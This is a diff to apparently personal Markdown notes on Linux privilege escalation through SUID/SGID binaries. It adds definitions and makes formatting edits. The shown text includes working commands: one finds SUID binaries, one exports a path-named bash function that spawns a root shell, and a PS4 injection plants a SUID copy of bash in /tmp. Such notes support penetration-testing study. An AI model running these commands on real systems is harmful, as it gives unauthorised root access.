@@ -1,8 +1,10 @@
 # Privileges Escalation - Linux
 # Exploiting SUID/SGID 
+- **SUID**: **Set User ID**. When an executable file has the SUID bit set, anyone who runs it does so with the permissions of the file's owner, usually **root**. Useful for allowing users to run programs that require elevated privileges without giving full root access.
+- **SGID**: ***Set Group ID**. When an executable file has the SGID bit set, anyone who runs it does so with the file's group (not the caller's).
 
 ## Executables
-- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null` to look for executables, hoping some of them have an obsolete (so vulnerable) version.
+- `find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2>/dev/null` to look for executables, hoping some of them have an obsolete (so vulnerable) version.
 - Search those versions on https://exploit-db.com or somewhere else, for example Github.
 - If we find something interesting, copy the exploit and paste it on a `.sh` file, to make it runnable.
 - Then run it to escalate privileges. Check if we became **root** with `whoami`.
@@ -33,14 +35,14 @@ Some binaries could have readable sequences of characters and they can be exploi
   - Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.
 
 ## Environment variables with full paths and vulnerable shell
-Check the shell version, for example with `/bin/bash --version` (if the shell is Bash). If the version is below 4.2-048, it's vulnerable and we can exploit shell functions with names that resemble file paths.
+Check the shell version, for example with `/bin/bash --version` (if the shell is Bash). If the version is **below** 4.2-048, it's vulnerable and we can exploit shell functions with names that resemble file paths.
 - If the previous `service` is defined **with** its full path (`/usr/sbin/service`), we can exploit it through the shell vulnerability.
 - So let's create a custom function that executes bash code:
   - `function /usr/sbin/service { /bin/bash -p; }` to run a root shell
   - `export -f /usr/sbin/service`
 - Now, running the binary we should be able to gain access to a root shell. Check it with `whoami`.
 
-If the shell version is above that one, anyway it will read `SHELLOPTS` and `PS4` variables before removing the SUID privileges (known bug). So we can exploit it with:
+If the shell version is **above** that one, anyway it will read `SHELLOPTS` and `PS4` variables before removing the SUID privileges (known bug). So we can exploit it with:
   - `env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' <BINARY PATH>` in which:
     - `env -i` executes a program in an empty environment, without inheriting any variables.
     - `SHELLOPTS=xtrace` turns on the debug mode.
